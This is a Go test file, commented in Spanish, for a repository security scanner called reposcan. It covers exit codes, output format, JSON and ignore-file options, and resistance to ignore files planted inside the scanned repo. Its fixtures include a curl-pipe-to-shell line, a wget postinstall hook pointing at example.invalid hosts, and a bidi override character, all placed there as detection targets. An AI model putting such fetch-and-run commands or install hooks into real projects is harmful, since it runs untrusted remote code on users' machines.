// Tests para el comando reposcan.
//
// ---------------------------------------------------------------------------
// El problema: ¿cómo se prueba main()?
// ---------------------------------------------------------------------------
//
// main() no recibe parámetros, no devuelve nada y termina con os.Exit, que
// mata el proceso al instante. Si un test llama a algo que hace os.Exit, se
// muere el binario de tests completo.
//
// Además está la trampa que te mencioné: os.Exit NO ejecuta los defer.
//
//	func main() {
//	    dir, _ := os.MkdirTemp("", "reposcan-*")
//	    defer os.RemoveAll(dir)  // <- NUNCA se ejecuta...
//	    ...
//	    os.Exit(1)               // <- ...porque esto termina el proceso aquí
//	}
//
// Resultado: cada escaneo con hallazgos deja un repo clonado en /tmp para
// siempre. Y como son repos potencialmente maliciosos, peor.
//
// La solución idiomática resuelve los dos problemas a la vez: mueve toda la
// lógica a una función que DEVUELVE el código de salida, y deja main mínimo:
//
//	func main() {
//	    os.Exit(run(os.Args[1:], os.Stdout, os.Stderr))
//	}
//
//	func run(args []string, stdout, stderr io.Writer) int {
//	    // aquí los defer sí se ejecutan, porque run termina con return
//	}
//
// Recibir stdout y stderr como io.Writer (una interfaz) es lo que permite
// testear: en producción le pasas os.Stdout; en los tests, un bytes.Buffer
// para luego leer qué se imprimió. Es el mismo patrón que con Analyzer:
// depender de una interfaz, no de un tipo concreto.
//
// ---------------------------------------------------------------------------
// Contrato que deben cumplir tus run y main
// ---------------------------------------------------------------------------
//
// Uso:
//
//	reposcan <url>         valida, clona en un directorio temporal y analiza
//	reposcan -dir <ruta>   analiza un directorio local (sin red)
//
// El modo -dir sirve para dos cosas: testear sin internet, y la fase de
// análisis dentro del contenedor sin red (paso 4 del plan original).
//
// Códigos de salida:
//
//	0 = sin hallazgos   1 = hay hallazgos   2 = error de uso o de ejecución
//
// Salida de cada hallazgo, una línea en STDOUT:
//
//	<archivo>:<línea>: [<severidad>] <regla>: <mensaje>
//	<archivo>: [<severidad>] <regla>: <mensaje>          (si Line es 0)
//
// Es el formato de compiladores y de grep. Muchos editores lo reconocen y
// te dejan hacer clic para saltar a esa línea.
//
// Orden: por archivo y luego por línea. Ojo: Walk recorre en orden, pero
// como cada archivo pasa por 4 analizadores, dentro de un archivo los
// hallazgos salen agrupados por analizador, no por línea. Tienes que
// ordenarlos. Investiga slices.SortStableFunc, cmp.Compare y cmp.Or.
//
// Todo lo que no sea un hallazgo va a STDERR: mensajes de uso, errores y
// archivos omitidos ("omitido: <ruta>"). Así, `reposcan -dir . > hallazgos.txt`
// guarda solo los hallazgos.
//
// Herramientas que vas a necesitar:
//   - flag.NewFlagSet con flag.ContinueOnError: el flag global (flag.Parse)
//     hace os.Exit si hay un error, y además no se puede reiniciar entre
//     tests. Un FlagSet propio, con SetOutput(stderr), devuelve el error.
//   - os.MkdirTemp + defer os.RemoveAll para el clon.
//   - Opcional: signal.NotifyContext para que Ctrl+C cancele el clon
//     (y gracias al return, igual se borre el directorio temporal).
//
// Cómo correrlos:
//
//	go test ./cmd/reposcan -v
//	REPOSCAN_NET_TESTS=1 go test ./cmd/reposcan -run TestRunURL -v   (con red)
package main

import (
	"bytes"
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// El binario real debe compilar
// ---------------------------------------------------------------------------

// Sorpresa: `go test` NO necesita que exista func main. El binario de tests
// trae su propio main (generado por Go) que llama a tus funciones Test*.
// Así que un paquete main sin func main pasa TODOS los demás tests, pero
// `go build` y `go run` fallan con:
//
//	function main is undeclared in the main package
//
// Este test compila el comando de verdad para atrapar ese caso.
func TestBinarioCompila(t *testing.T) {
	// exec.LookPath busca "go" en el PATH. Si no está (raro, pero posible
	// en algunos entornos de CI), saltamos el test en vez de fallar.
	goBin, err := exec.LookPath("go")
	if err != nil {
		t.Skip("no se encontró el comando go en el PATH")
	}

	// Durante `go test`, el directorio actual es el del paquete
	// (cmd/reposcan), así que "." es este mismo comando.
	out := filepath.Join(t.TempDir(), "reposcan")
	cmd := exec.Command(goBin, "build", "-o", out, ".")
	if output, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("go build falló: %v\n%s", err, output)
	}

	// Y que el binario realmente arranque: sin argumentos debe salir con 2.
	// Esto prueba que main llama a run y respeta su código de salida.
	err = exec.Command(out).Run()

	// errors.As sería lo más general; aquí basta una type assertion:
	// un proceso que termina con código distinto de 0 devuelve *exec.ExitError.
	exitErr, ok := err.(*exec.ExitError)
	if !ok || exitErr.ExitCode() != 2 {
		t.Errorf("el binario sin argumentos debe salir con código 2, got err=%v", err)
	}
}

// result agrupa lo que devuelve una ejecución de run.
type result struct {
	code   int
	stdout string
	stderr string
}

// execute llama a run capturando su salida en buffers.
//
// bytes.Buffer implementa io.Writer, así que se le puede pasar a run en
// lugar de os.Stdout. Después leemos lo que se escribió con .String().
func execute(t *testing.T, args ...string) result {
	t.Helper()
	var stdout, stderr bytes.Buffer
	code := run(args, &stdout, &stderr) // &: Write tiene receptor puntero
	return result{code, stdout.String(), stderr.String()}
}

// writeFile crea un archivo dentro de root, creando carpetas si hace falta.
func writeFile(t *testing.T, root, rel, content string) {
	t.Helper()
	path := filepath.Join(root, filepath.FromSlash(rel))
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

// ---------------------------------------------------------------------------
// Errores de uso: todos deben dar código 2, sin tocar stdout.
// ---------------------------------------------------------------------------

func TestRunErroresDeUso(t *testing.T) {
	dir := t.TempDir()

	tests := []struct {
		name string
		args []string
	}{
		{"sin argumentos", nil},
		{"dos urls", []string{"https://github.com/a/b", "https://github.com/c/d"}},
		{"url y -dir a la vez", []string{"-dir", dir, "https://github.com/a/b"}},
		{"flag desconocido", []string{"-nope"}},
		{"-dir sin valor", []string{"-dir"}},
		// ValidateURL debe rechazarla ANTES de intentar clonar. Este caso no
		// necesita red: si tu run intenta clonar, fallará por otro motivo y
		// el test lo detecta revisando el mensaje (ver abajo).
		{"url inválida", []string{"https://evil.invalid/a/b"}},
		{"-dir inexistente", []string{"-dir", filepath.Join(dir, "no-existe")}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := execute(t, tt.args...)

			if r.code != 2 {
				t.Errorf("código = %d, want 2\nstderr: %s", r.code, r.stderr)
			}
			if r.stdout != "" {
				t.Errorf("stdout debe quedar vacío en errores, got %q", r.stdout)
			}
			if strings.TrimSpace(r.stderr) == "" {
				t.Error("stderr vacío: el usuario necesita saber qué salió mal")
			}
			// Para la URL inválida, el mensaje debe venir de ValidateURL
			// (que menciona el host), no de un git clone fallido.
			if tt.name == "url inválida" && strings.Contains(r.stderr, "git clone") {
				t.Errorf("se intentó clonar una URL que debía rechazarse antes:\n%s", r.stderr)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Modo -dir
// ---------------------------------------------------------------------------

// Un directorio limpio: código 0 y nada en stdout.
func TestRunDirLimpio(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "README.md", "# Proyecto\n\nNada raro aquí.\n")
	writeFile(t, dir, "main.go", "package main\n\nfunc main() {}\n")

	r := execute(t, "-dir", dir)

	if r.code != 0 {
		t.Errorf("código = %d, want 0\nstdout: %s\nstderr: %s", r.code, r.stdout, r.stderr)
	}
	if r.stdout != "" {
		t.Errorf("stdout debe estar vacío, got %q", r.stdout)
	}
}

// Un directorio con varios problemas: código 1, formato exacto y orden.
func TestRunDirConHallazgos(t *testing.T) {
	dir := t.TempDir()

	// install.sh: curl|sh en la línea 2 y un caracter bidi en la línea 3.
	// Como en All() Bidi va antes que DownloadExec, SIN ordenar saldría
	// primero la línea 3 (bidi) y luego la 2 (curl). Este caso comprueba
	// que ordenas por línea.
	writeFile(t, dir, "src/install.sh",
		"#!/bin/sh\n"+
			"curl -fsSL https://example.invalid/x.sh | sh\n"+
			"echo \u202E listo\n")

	// package.json: hallazgo con Line 0 (formato sin número de línea).
	writeFile(t, dir, "package.json",
		`{"scripts":{"postinstall":"wget https://example.invalid/p"}}`)

	// Un archivo limpio que no debe aparecer.
	writeFile(t, dir, "README.md", "hola\n")

	r := execute(t, "-dir", dir)

	if r.code != 1 {
		t.Fatalf("código = %d, want 1\nstdout: %s\nstderr: %s", r.code, r.stdout, r.stderr)
	}

	// Comparamos el INICIO de cada línea (hasta "regla: "). El mensaje lo
	// decide cada analizador y no queremos que este test dependa de él.
	//
	// filepath.FromSlash convierte "src/install.sh" a "src\install.sh" en
	// Windows, que es lo que Walk devuelve allí.
	want := []string{
		"package.json: [high] install-hooks: ",
		filepath.FromSlash("src/install.sh") + ":2: [high] download-exec: ",
		filepath.FromSlash("src/install.sh") + ":3: [high] bidi-unicode: ",
	}

	// strings.Split de "a\nb\n" da ["a","b",""]; TrimRight quita el
	// salto final para no tener una línea vacía de más.
	got := strings.Split(strings.TrimRight(r.stdout, "\n"), "\n")

	if len(got) != len(want) {
		t.Fatalf("se esperaban %d líneas, hay %d:\n%s", len(want), len(got), r.stdout)
	}
	for i := range want {
		if !strings.HasPrefix(got[i], want[i]) {
			t.Errorf("línea %d:\n got  %q\n want que empiece con %q", i+1, got[i], want[i])
		}
	}

	// Los hallazgos van a stdout; stderr no debe repetirlos.
	if strings.Contains(r.stderr, "download-exec") {
		t.Errorf("los hallazgos no deben ir a stderr:\n%s", r.stderr)
	}
}

// Los archivos omitidos por tamaño se avisan en stderr, no en stdout.
func TestRunDirArchivoOmitido(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "ok.txt", "hola\n")
	// 3 MB: supera el límite de 2 MB de Walk.
	writeFile(t, dir, "enorme.bin", strings.Repeat("a", 3<<20))

	r := execute(t, "-dir", dir)

	if r.code != 0 {
		t.Errorf("un archivo omitido no es un hallazgo: código = %d, want 0", r.code)
	}
	if !strings.Contains(r.stderr, "omitido: enorme.bin") {
		t.Errorf("stderr debe avisar del archivo omitido, got %q", r.stderr)
	}
	if strings.Contains(r.stdout, "enorme.bin") {
		t.Errorf("el aviso de omitido no va en stdout, got %q", r.stdout)
	}
}

// ---------------------------------------------------------------------------
// Modo URL (con red): el test de la trampa defer + os.Exit
// ---------------------------------------------------------------------------

// Este test clona un repo real y luego verifica que el directorio temporal
// del clon se haya BORRADO. Si tu código hace os.Exit dentro de run, o si
// olvidas el defer os.RemoveAll, este test falla.
//
// Truco: os.MkdirTemp("", ...) usa os.TempDir(), que en Linux y macOS lee la
// variable de entorno TMPDIR. Con t.Setenv apuntamos TMPDIR a una carpeta
// vacía propia del test; al final, esa carpeta debe seguir vacía.
// (t.Setenv restaura el valor original al terminar el test.)
//
// En Windows, os.TempDir() lee TMP/TEMP en lugar de TMPDIR, así que este
// test no aplica tal cual.
func TestRunURLLimpiaTemporal(t *testing.T) {
	if os.Getenv("REPOSCAN_NET_TESTS") != "1" {
		t.Skip("define REPOSCAN_NET_TESTS=1 para correr tests con red")
	}

	tmp := t.TempDir()
	t.Setenv("TMPDIR", tmp)

	// Hello-World de octocat: un repo diminuto con solo un README.
	r := execute(t, "https://github.com/octocat/Hello-World")

	if r.code != 0 {
		t.Fatalf("código = %d, want 0\nstdout: %s\nstderr: %s", r.code, r.stdout, r.stderr)
	}

	entries, err := os.ReadDir(tmp)
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 0 {
		var names []string
		for _, e := range entries {
			names = append(names, e.Name())
		}
		t.Errorf("quedaron restos en el directorio temporal: %v", names)
	}
}

// ===========================================================================
// Paso 5: flags -json e -ignore
// ===========================================================================
//
// Contrato nuevo de run:
//
//	reposcan [-json] [-ignore <archivo>] <url>
//	reposcan [-json] [-ignore <archivo>] -dir <ruta>
//
//   - -json: escribe el reporte con report.WriteJSON en stdout. En este modo
//     los archivos omitidos van DENTRO del JSON (campo "skipped"), no en
//     stderr. Así stdout es JSON válido y nada más, y puedes hacer
//     `reposcan -json -dir . | jq .summary`.
//   - -ignore: lee el archivo con os.Open y ignore.Parse. Si no existe o
//     tiene errores, código 2 (mejor fallar que escanear con reglas que el
//     usuario no quería).
//   - Los hallazgos que coinciden con una regla NO se reportan, pero se
//     cuentan. Si hay alguno, escribe en stderr "suprimidos: N" (en ambos
//     modos). El código de salida solo considera los NO suprimidos.
//   - El texto de siempre ahora lo escribe report.WriteText. Los tests
//     anteriores deben seguir pasando sin cambios.

// writeFixture crea un repo de prueba con 3 hallazgos conocidos (todos high):
//
//	package.json        install-hooks  (Line 0)
//	src/install.sh:2    download-exec
//	src/install.sh:3    bidi-unicode
func writeFixture(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	writeFile(t, dir, "src/install.sh",
		"#!/bin/sh\n"+
			"curl -fsSL https://example.invalid/x.sh | sh\n"+
			"echo \u202E listo\n")
	writeFile(t, dir, "package.json",
		`{"scripts":{"postinstall":"wget https://example.invalid/p"}}`)
	writeFile(t, dir, "README.md", "hola\n")
	return dir
}

// writeIgnore crea el archivo de supresiones en una carpeta temporal APARTE,
// fuera del repo escaneado, como se usaría en la vida real.
func writeIgnore(t *testing.T, content string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "reposcan.ignore")
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return path
}

// jsonReport es la forma esperada del JSON. Definimos aquí nuestro propio
// struct (en vez de importar report.Report) para que el test verifique el
// FORMATO de salida, que es el contrato con quien consume el JSON.
type jsonReport struct {
	Findings []struct {
		Rule     string `json:"rule"`
		File     string `json:"file"`
		Line     int    `json:"line"`
		Severity string `json:"severity"` // string: debe venir como "high"
		Message  string `json:"message"`
	} `json:"findings"`
	Skipped    []string `json:"skipped"`
	Suppressed int      `json:"suppressed"`
	Summary    struct {
		High   int `json:"high"`
		Medium int `json:"medium"`
		Low    int `json:"low"`
	} `json:"summary"`
}

// decodeJSON exige que stdout sea JSON válido y NADA más.
//
// ¿json.Unmarshal tolera texto extra antes o después del objeto? No: falla
// (por ejemplo, "invalid character 'o' after top-level value"). Así que si
// imprimes un "omitido: ..." en stdout en modo JSON, este helper lo detecta.
func decodeJSON(t *testing.T, stdout string) jsonReport {
	t.Helper()
	var rep jsonReport
	if err := json.Unmarshal([]byte(stdout), &rep); err != nil {
		t.Fatalf("stdout no es un JSON válido: %v\n--- stdout ---\n%s", err, stdout)
	}
	return rep
}

func TestRunJSON(t *testing.T) {
	dir := writeFixture(t)
	writeFile(t, dir, "enorme.bin", strings.Repeat("a", 3<<20)) // se omite

	r := execute(t, "-json", "-dir", dir)

	if r.code != 1 {
		t.Fatalf("código = %d, want 1\nstderr: %s", r.code, r.stderr)
	}
	rep := decodeJSON(t, r.stdout)

	// Mismo orden que en el modo texto.
	want := []string{
		"package.json:0:install-hooks:high",
		filepath.FromSlash("src/install.sh") + ":2:download-exec:high",
		filepath.FromSlash("src/install.sh") + ":3:bidi-unicode:high",
	}
	if len(rep.Findings) != len(want) {
		t.Fatalf("se esperaban %d hallazgos, hay %d:\n%s", len(want), len(rep.Findings), r.stdout)
	}
	for i, f := range rep.Findings {
		got := f.File + ":" + itoa(f.Line) + ":" + f.Rule + ":" + f.Severity
		if got != want[i] {
			t.Errorf("hallazgo %d = %s, want %s", i, got, want[i])
		}
	}

	if rep.Summary.High != 3 || rep.Summary.Medium != 0 || rep.Summary.Low != 0 {
		t.Errorf("summary = %+v, want high=3", rep.Summary)
	}
	if len(rep.Skipped) != 1 || rep.Skipped[0] != "enorme.bin" {
		t.Errorf("skipped = %v, want [enorme.bin]", rep.Skipped)
	}
	// En modo JSON, los omitidos van en el JSON, no en stderr.
	if strings.Contains(r.stderr, "omitido") {
		t.Errorf("en modo -json los omitidos no van a stderr:\n%s", r.stderr)
	}
}

func TestRunJSONLimpio(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "README.md", "hola\n")

	r := execute(t, "-json", "-dir", dir)

	if r.code != 0 {
		t.Fatalf("código = %d, want 0\nstderr: %s", r.code, r.stderr)
	}
	// Un directorio limpio en modo JSON igual imprime un reporte (vacío),
	// no "nada": quien lo consume siempre recibe un JSON que parsear.
	decodeJSON(t, r.stdout)
	if !strings.Contains(r.stdout, `"findings": []`) {
		t.Errorf(`se esperaba "findings": [] (no null):\n%s`, r.stdout)
	}
}

func TestRunIgnore(t *testing.T) {
	tests := []struct {
		name        string
		ignore      string
		wantCode    int
		wantRules   []string // reglas que deben quedar en stdout, en orden
		wantSupprim string   // texto esperado en stderr ("" = no debe aparecer)
	}{
		{
			name:        "suprime solo el hook de package.json",
			ignore:      "# los hooks de este repo ya los revisé\npackage.json install-hooks\n",
			wantCode:    1,
			wantRules:   []string{"download-exec", "bidi-unicode"},
			wantSupprim: "suprimidos: 1",
		},
		{
			name:        "suprime una carpeta completa",
			ignore:      "src/\n",
			wantCode:    1,
			wantRules:   []string{"install-hooks"},
			wantSupprim: "suprimidos: 2",
		},
		{
			// Si todo queda suprimido, el código debe ser 0: el usuario ya
			// decidió que esos hallazgos no le importan.
			name:        "suprime todo",
			ignore:      "*\nsrc/\n",
			wantCode:    0,
			wantRules:   nil,
			wantSupprim: "suprimidos: 3",
		},
		{
			name:        "reglas que no coinciden con nada",
			ignore:      "vendor/\n",
			wantCode:    1,
			wantRules:   []string{"install-hooks", "download-exec", "bidi-unicode"},
			wantSupprim: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := writeFixture(t)
			ign := writeIgnore(t, tt.ignore)

			r := execute(t, "-ignore", ign, "-dir", dir)

			if r.code != tt.wantCode {
				t.Fatalf("código = %d, want %d\nstdout: %s\nstderr: %s", r.code, tt.wantCode, r.stdout, r.stderr)
			}

			var gotRules []string
			for _, line := range strings.Split(strings.TrimRight(r.stdout, "\n"), "\n") {
				if line == "" {
					continue
				}
				// Formato: "<loc>: [<sev>] <regla>: <mensaje>". La regla va
				// justo después de "] " y antes del siguiente ": ".
				_, rest, ok := strings.Cut(line, "] ")
				if !ok {
					t.Fatalf("línea con formato inesperado: %q", line)
				}
				rule, _, _ := strings.Cut(rest, ": ")
				gotRules = append(gotRules, rule)
			}
			if strings.Join(gotRules, ",") != strings.Join(tt.wantRules, ",") {
				t.Errorf("reglas en stdout = %v, want %v", gotRules, tt.wantRules)
			}

			if tt.wantSupprim == "" {
				if strings.Contains(r.stderr, "suprimidos") {
					t.Errorf("no había nada suprimido, pero stderr dice:\n%s", r.stderr)
				}
			} else if !strings.Contains(r.stderr, tt.wantSupprim) {
				t.Errorf("stderr debe contener %q, got:\n%s", tt.wantSupprim, r.stderr)
			}
		})
	}
}

// -json e -ignore juntos: el JSON informa cuántos se suprimieron.
func TestRunJSONConIgnore(t *testing.T) {
	dir := writeFixture(t)
	ign := writeIgnore(t, "src/\n")

	r := execute(t, "-json", "-ignore", ign, "-dir", dir)

	if r.code != 1 {
		t.Fatalf("código = %d, want 1\nstderr: %s", r.code, r.stderr)
	}
	rep := decodeJSON(t, r.stdout)
	if len(rep.Findings) != 1 || rep.Findings[0].Rule != "install-hooks" {
		t.Errorf("findings = %+v, want solo install-hooks", rep.Findings)
	}
	if rep.Suppressed != 2 {
		t.Errorf("suppressed = %d, want 2", rep.Suppressed)
	}
	// El resumen cuenta solo lo que se reporta, no lo suprimido.
	if rep.Summary.High != 1 {
		t.Errorf("summary.high = %d, want 1", rep.Summary.High)
	}
}

// LA prueba de seguridad de este paso: un .reposcanignore DENTRO del repo
// escaneado no debe tener ningún efecto. El repo es del atacante.
func TestRunIgnoreDentroDelRepoNoTieneEfecto(t *testing.T) {
	dir := writeFixture(t)
	// El atacante intenta silenciar todo con los nombres más obvios.
	writeFile(t, dir, ".reposcanignore", "*\nsrc/\n")
	writeFile(t, dir, "reposcan.ignore", "*\nsrc/\n")

	r := execute(t, "-dir", dir)

	if r.code != 1 {
		t.Fatalf("código = %d, want 1: un archivo del repo escaneado suprimió hallazgos", r.code)
	}
	if n := strings.Count(r.stdout, "\n"); n != 3 {
		t.Errorf("se esperaban los 3 hallazgos del fixture, hay %d:\n%s", n, r.stdout)
	}
	if strings.Contains(r.stderr, "suprimidos") {
		t.Errorf("no debía suprimirse nada:\n%s", r.stderr)
	}
}

func TestRunIgnoreErrores(t *testing.T) {
	dir := writeFixture(t)

	tests := []struct {
		name    string
		ignore  string // ruta al archivo
		wantErr string // texto esperado en stderr
	}{
		{"archivo inexistente", filepath.Join(t.TempDir(), "no-existe"), "no-existe"},
		{"patrón inválido", writeIgnore(t, "ok.txt\n[abc\n"), "línea 2"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := execute(t, "-ignore", tt.ignore, "-dir", dir)
			if r.code != 2 {
				t.Errorf("código = %d, want 2", r.code)
			}
			if r.stdout != "" {
				t.Errorf("stdout debe quedar vacío, got %q", r.stdout)
			}
			if !strings.Contains(r.stderr, tt.wantErr) {
				t.Errorf("stderr debe mencionar %q, got:\n%s", tt.wantErr, r.stderr)
			}
		})
	}
}

// itoa evita importar strconv solo para esto.
func itoa(n int) string {
	b, _ := json.Marshal(n)
	return string(b)
}
